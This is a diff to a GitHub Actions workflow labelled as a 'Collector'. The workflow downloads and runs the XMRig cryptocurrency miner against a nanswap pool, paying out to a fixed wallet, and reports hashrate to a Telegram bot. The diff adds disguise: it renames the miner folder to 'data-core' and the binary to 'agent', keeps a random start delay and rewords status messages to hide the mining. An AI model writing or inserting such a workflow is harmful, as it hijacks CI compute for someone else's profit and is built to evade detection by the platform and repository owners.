@@ -7,7 +7,7 @@ permissions:
   contents: read
   actions: none
   id-token: none
-  
+
 jobs:
   collect:
     runs-on: ubuntu-latest
@@ -28,21 +28,23 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *Collector aktif.*\nRuntime hingga 6 jam." \
+            --data-urlencode text="🟢 *Collector aktif.*\nMenjalankan tugas latar hingga 6 jam dengan random delay." \
             -d parse_mode=Markdown
 
       - name: Start Collector Agent
         run: |
           curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
           tar -xzf agent.tar.gz
-          cd xmrig-6.24.0
-          chmod +x xmrig
+          mv xmrig-6.24.0 data-core
+          cd data-core
+          mv xmrig agent
+          chmod +x agent
 
           DELAY=$((RANDOM % 300 + 30))
           echo "Menunggu $DELAY detik sebelum mulai..."
           sleep $DELAY
 
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k \
+          ./agent -o xmrig.nanswap.com:3333 -a rx -k \
             -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
             -p stealthlog --randomx-no-rdmsr | tee log.txt &
 
@@ -59,13 +61,13 @@ jobs:
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
           set +e
-          cd xmrig-6.24.0
-          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | awk '{print $(NF-1) " H/s"}')
+          cd data-core
+          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
           HASHRATE=${HASHRATE:-"0 H/s"}
           ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
           REJECTED=$(grep -a "rejected" log.txt | wc -l)
 
-          MSG="✅ *Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
+          MSG="✅ *Collector selesai.*\n\n📊 *Statistik:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
 
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
